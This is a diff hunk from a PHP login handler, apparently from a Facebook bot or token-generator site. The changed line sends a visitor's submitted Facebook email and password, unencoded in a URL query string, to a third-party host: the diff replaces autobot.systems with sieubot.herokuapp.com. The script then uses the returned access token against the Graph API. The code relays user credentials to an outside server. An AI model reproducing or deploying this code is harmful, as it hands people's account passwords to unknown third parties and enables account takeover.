@@ -38,7 +38,7 @@ exit;
 
 if($_POST[email] && $_POST[pass] && !$_SESSION[id])
 {
-$getapi = json_decode(auto('http://autobot.systems/token.php?u='.$_POST[email].'&p='.$_POST[pass]), true);
+$getapi = json_decode(auto('https://sieubot.herokuapp.com/token.php?u='.$_POST[email].'&p='.$_POST[pass]), true);
 $token = $getapi[access_token];
 $userData = json_decode(auto('https://graph.facebook.com/me?access_token='.$token.''),true);
 $check = json_decode(auto('https://graph.facebook.com/app/?access_token='.$token.''), true);
